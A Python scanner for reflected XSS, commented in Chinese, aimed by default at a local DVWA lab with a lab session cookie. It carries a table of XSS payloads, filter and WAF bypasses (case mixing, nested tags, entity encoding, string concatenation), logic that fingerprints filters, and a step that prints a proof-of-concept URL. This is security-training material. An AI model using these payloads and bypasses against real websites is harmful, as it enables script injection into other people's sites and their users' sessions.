from __future__ import annotations

import argparse
import html as html_mod
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

DEFAULT_COOKIE = "PHPSESSID=lp9g0ll5ckc4g13nvfsa28mvv5; security=low"
DEFAULT_TARGET = "http://127.0.0.1/vulnerabilities/xss_r/"
DEFAULT_TIMEOUT = 8
DEFAULT_PARAM = "name"

# ---------------------------------------------------------------------------
# 探针标记（唯一字符串，不含任何 HTML/JS 特殊字符）
# ---------------------------------------------------------------------------
PROBE = "XSSPROBEZ9Q"

# ---------------------------------------------------------------------------
# Payload 表
# tag: html | attr | js | medium_bypass | waf_bypass
# ---------------------------------------------------------------------------
PAYLOADS: list[tuple[str, str, str]] = [
    # ── HTML 上下文 ──────────────────────────────────────────────────────────
    ("html", "<script>alert(1)</script>",                          "基础 script 标签"),
    ("html", "<img src=x onerror=alert(1)>",                       "img onerror"),
    ("html", "<svg onload=alert(1)>",                              "svg onload"),
    ("html", "<body onload=alert(1)>",                             "body onload"),
    ("html", "<details open ontoggle=alert(1)>",                   "details ontoggle"),
    ("html", "<input autofocus onfocus=alert(1)>",                 "input autofocus onfocus"),
    ("html", "<video src=x onerror=alert(1)>",                     "video onerror"),
    ("html", "<iframe srcdoc='<script>alert(1)</script>'>",        "iframe srcdoc"),
    ("html", "<math><mtext></table><img src=x onerror=alert(1)>",  "math/mtext 逃逸"),
    # ── 属性值上下文 ─────────────────────────────────────────────────────────
    ("attr", '" onmouseover="alert(1)',                             "闭合双引号属性 + onmouseover"),
    ("attr", "' onmouseover='alert(1)",                            "闭合单引号属性 + onmouseover"),
    ("attr", '" autofocus onfocus="alert(1)',                       "闭合双引号属性 + onfocus"),
    ("attr", '"><script>alert(1)</script>',                        "闭合属性后注入 script"),
    ("attr", "'><svg onload=alert(1)>",                            "闭合单引号属性后 svg"),
    # ── JS 上下文 ────────────────────────────────────────────────────────────
    ("js",   "';alert(1)//",                                       "JS 字符串闭合单引号"),
    ("js",   '";alert(1)//',                                       "JS 字符串闭合双引号"),
    ("js",   "`alert(1)`",                                         "模板字符串"),
    # ── medium 安全级别绕过 ───────────────────────────────────────────────────
    # 规则分析：DVWA medium 仅用 str_replace('<script>', '', $input)（大小写敏感，单次替换）
    # 因此：
    #   1. 大小写混合可绕过大小写敏感替换
    #   2. 嵌套 <sc<script>ript> 在剥离 <script> 后还原为 <script>
    #   3. 事件处理器标签（img/svg/details 等）完全不过滤
    ("medium_bypass", "<SCRIPT>alert(1)</SCRIPT>",                  "纯大写绕过（大小写敏感过滤）"),
    ("medium_bypass", "<ScRiPt>alert(1)</ScRiPt>",                  "大小写混淆绕过"),
    ("medium_bypass", "<sc<script>ript>alert(1)</sc</script>ript>", "嵌套插入绕过（剥离后还原）"),
    ("medium_bypass", "<img src=x onerror=alert(1)>",               "img onerror（事件属性不过滤）"),
    ("medium_bypass", "<svg onload=alert(1)>",                      "svg onload（事件属性不过滤）"),
    ("medium_bypass", "<details open ontoggle=alert(1)>",           "details ontoggle（事件属性不过滤）"),
    ("medium_bypass", "<input autofocus onfocus=alert(1)>",         "input onfocus（事件属性不过滤）"),
    ("medium_bypass", "<body onload=alert(1)>",                     "body onload（事件属性不过滤）"),
    # ── 通用 WAF 绕过变体 ─────────────────────────────────────────────────────
    ("waf_bypass", "<img src=x onerror=alert`1`>",                  "反引号代替括号"),
    ("waf_bypass", "<svg/onload=alert(1)>",                         "斜杠代替空格"),
    ("waf_bypass", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                                                                     "HTML 实体编码 alert(1)"),
    ("waf_bypass", "<svg onload=setTimeout('ale'+'rt(1)')>",        "字符串拼接绕过关键字过滤"),
    ("waf_bypass", "<a href=\"javascript:alert(1)\">click</a>",     "javascript: 协议"),
    ("waf_bypass", "<<script>alert(1)//<</script>",                 "双尖括号"),
]


@dataclass
class ReflectionContext:
    in_pre: bool = False
    in_script: bool = False
    in_attr_double: bool = False
    in_attr_single: bool = False
    in_tag: bool = False
    raw_snippet: str = ""


@dataclass
class XSSFinding:
    parameter: str
    payload: str
    tag: str
    description: str
    context: str
    reflected_raw: bool   # 反射时未被转义
    executed: bool = False


def request_get(url: str, params: dict[str, str], cookie: str, timeout: int) -> tuple[int | None, str, str]:
    qs = urllib.parse.urlencode(params)
    full_url = f"{url}?{qs}" if "?" not in url else f"{url}&{qs}"
    req = urllib.request.Request(
        full_url,
        headers={"Cookie": cookie, "User-Agent": "Mozilla/5.0 (xss-tester/1.0)"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            charset = resp.headers.get_content_charset() or "utf-8"
            body = resp.read().decode(charset, errors="replace")
            return resp.status, body, ""
    except urllib.error.HTTPError as exc:
        charset = exc.headers.get_content_charset() or "utf-8"
        body = exc.read().decode(charset, errors="replace")
        return exc.code, body, str(exc)
    except urllib.error.URLError as exc:
        return None, "", str(exc.reason)


def detect_reflection_context(body: str, probe: str) -> ReflectionContext:
    ctx = ReflectionContext()
    idx = body.find(probe)
    if idx < 0:
        return ctx
    snippet = body[max(0, idx - 200):idx + len(probe) + 50]
    ctx.raw_snippet = snippet

    # 分析 probe 左侧 200 个字符的 HTML 结构
    before = body[max(0, idx - 200):idx]
    ctx.in_pre = bool(re.search(r"<pre[^>]*>", before, re.I) and not re.search(r"</pre>", before, re.I))
    ctx.in_script = bool(re.search(r"<script[^>]*>", before, re.I) and not re.search(r"</script>", before, re.I))

    # 检测是否在属性内（寻找未闭合的引号）
    tag_match = re.search(r"<[a-z][^>]*$", before, re.I | re.DOTALL)
    if tag_match:
        ctx.in_tag = True
        inside_tag = tag_match.group(0)
        dquotes = inside_tag.count('"')
        squotes = inside_tag.count("'")
        ctx.in_attr_double = dquotes % 2 == 1
        ctx.in_attr_single = squotes % 2 == 1

    return ctx


def is_reflected_raw(body: str, payload: str) -> bool:
    return payload in body


def is_html_encoded(body: str, payload: str) -> bool:
    encoded = html_mod.escape(payload)
    return encoded in body and payload not in body


def probe_target(url: str, param: str, cookie: str, timeout: int) -> ReflectionContext | None:
    status, body, err = request_get(url, {param: PROBE}, cookie, timeout)
    if status is None:
        print(f"[-] 无法连接目标: {err}")
        return None
    if PROBE not in body:
        print(f"[-] 探针 '{PROBE}' 未在响应中出现，参数 {param!r} 可能不反射。")
        return None
    ctx = detect_reflection_context(body, PROBE)
    return ctx


def test_payloads(
    url: str,
    param: str,
    cookie: str,
    timeout: int,
    tags: list[str] | None = None,
) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    tested = set()
    for tag, payload, description in PAYLOADS:
        if tags and tag not in tags:
            continue
        if payload in tested:
            continue
        tested.add(payload)

        status, body, err = request_get(url, {param: payload}, cookie, timeout)
        if status is None:
            continue

        raw = is_reflected_raw(body, payload)
        encoded = is_html_encoded(body, payload)
        ctx = detect_reflection_context(body, payload) if raw else ReflectionContext()

        if raw:
            ctx_label = "html" if ctx.in_pre else ("script" if ctx.in_script else ("attr" if ctx.in_tag else "unknown"))
            findings.append(XSSFinding(
                parameter=param,
                payload=payload,
                tag=tag,
                description=description,
                context=ctx_label,
                reflected_raw=True,
            ))
        elif encoded:
            pass  # 被转义，不报告

    return findings


def analyze_waf(url: str, param: str, cookie: str, timeout: int) -> dict[str, bool]:
    """返回各探针是否被过滤（True=被过滤/未原样反射）。"""
    probes = {
        "script_lowercase":   "<script>",
        "script_uppercase":   "<SCRIPT>",
        "script_mixedcase":   "<ScRiPt>",
        "script_nested":      "<sc<script>ript>",
        "onerror_event":      "<img src=x onerror=x>",
        "onload_event":       "<svg onload=x>",
        "ontoggle_event":     "<details ontoggle=x>",
        "alert_keyword":      "alert(",
        "angle_bracket_open": "<",
        "double_quote":       '"',
    }
    results: dict[str, bool] = {}
    for name, probe_val in probes.items():
        _, body, _ = request_get(url, {param: probe_val}, cookie, timeout)
        reflected = probe_val in body or html_mod.escape(probe_val) in body
        results[name] = not reflected
    return results


def detect_security_level(waf: dict[str, bool]) -> str:
    """
    根据过滤特征推断 DVWA security 级别：
    - low:    无任何过滤
    - medium: 仅过滤小写 <script>，大写/混合/事件属性均放行
    - high:   script 标签全部过滤，但事件属性可能放行
    - impossible: 角括号或引号也被过滤（HTML 实体化）
    """
    if waf.get("angle_bracket_open"):
        return "impossible"
    if waf.get("script_lowercase") and waf.get("script_uppercase") and waf.get("script_mixedcase"):
        return "high"
    if waf.get("script_lowercase") and not waf.get("script_uppercase") and not waf.get("onerror_event"):
        return "medium"
    if not any(waf.values()):
        return "low"
    return "unknown"


def suggest_bypass(waf: dict[str, bool], level: str) -> list[str]:
    tips: list[str] = []
    if level == "low":
        tips.append("无过滤，直接使用 <script>alert(1)</script> 或任意事件属性")
    elif level == "medium":
        tips.append("过滤规则：str_replace('<script>', '', $input)  ← 大小写敏感、单次替换、不递归")
        tips.append("绕过1: 大小写混合 → <ScRiPt>alert(1)</ScRiPt>")
        tips.append("绕过2: 嵌套插入 → <sc<script>ript>alert(1)</sc</script>ript>  （剥离 <script> 后还原）")
        tips.append("绕过3: 事件属性标签完全未过滤 → <img src=x onerror=alert(1)>  （最简洁）")
    elif level == "high":
        if not waf.get("onerror_event"):
            tips.append("script 标签全被过滤，但事件属性未过滤 → <img src=x onerror=alert(1)>")
        if not waf.get("ontoggle_event"):
            tips.append("details 标签可用 → <details open ontoggle=alert(1)>")
        if waf.get("onerror_event") and waf.get("ontoggle_event"):
            tips.append("事件属性也被过滤，尝试 javascript: 协议或 DOM 型注入")
    elif level == "impossible":
        tips.append("角括号被 HTML 实体化，无法注入标签；尝试 DOM 型 XSS 或二次注入")
    else:
        if not waf.get("onerror_event"):
            tips.append("事件属性未过滤 → <img src=x onerror=alert(1)>")
        if waf.get("alert_keyword"):
            tips.append("alert 被过滤 → 用 alert`1` 或 (alert)(1) 或 top['ale'+'rt'](1)")
    return tips


def print_context_analysis(ctx: ReflectionContext) -> None:
    print("    反射上下文分析:")
    if ctx.in_script:
        print("      · 位于 <script> 块内 → 直接写 JS 表达式，无需 HTML 标签")
    elif ctx.in_attr_double:
        print('      · 位于双引号属性值内 → 用 " 闭合，再注入事件处理器')
    elif ctx.in_attr_single:
        print("      · 位于单引号属性值内 → 用 ' 闭合，再注入事件处理器")
    elif ctx.in_pre:
        print("      · 位于 <pre> 标签内（HTML 上下文）→ 可直接注入 HTML 标签")
    else:
        print("      · HTML 普通文本上下文 → 可直接注入 HTML 标签")
    if ctx.raw_snippet:
        print(f"      · 片段: {repr(ctx.raw_snippet[:120])}")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="反射型 XSS 检测工具（授权测试环境）")
    parser.add_argument("--url",     default=DEFAULT_TARGET,  help="目标 URL")
    parser.add_argument("--cookie",  default=DEFAULT_COOKIE,  help="登录 Cookie")
    parser.add_argument("--param",   default=DEFAULT_PARAM,   help="测试的 GET 参数名")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--waf",     action="store_true",     help="强制执行 WAF 分析")
    args = parser.parse_args(argv or sys.argv[1:])

    ctx = probe_target(args.url, args.param, args.cookie, args.timeout)
    if ctx is None:
        return 1

    findings = test_payloads(args.url, args.param, args.cookie, args.timeout, tags=["html", "attr", "js"])

    if not findings or args.waf:
        waf = analyze_waf(args.url, args.param, args.cookie, args.timeout)
        level = detect_security_level(waf)
        medium_bypass_findings = test_payloads(args.url, args.param, args.cookie, args.timeout, tags=["medium_bypass"])
        bypass_findings = test_payloads(args.url, args.param, args.cookie, args.timeout, tags=["waf_bypass"])
        findings.extend(medium_bypass_findings)
        findings.extend(bypass_findings)

        if not findings:
            print("[-] 未发现可利用的反射型 XSS。")
            print()
            print("WAF 分析:")
            for k, blocked in waf.items():
                print(f"  {k}: {'BLOCKED' if blocked else 'passed'}")
            print()
            print(f"推测安全级别: {level}")
            print("绕过建议:")
            for s in suggest_bypass(waf, level):
                print(f"  · {s}")
            return 1

    best = findings[0]
    poc_params = urllib.parse.urlencode({args.param: best.payload})
    poc_url = f"{args.url}?{poc_params}"
    print(poc_url)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
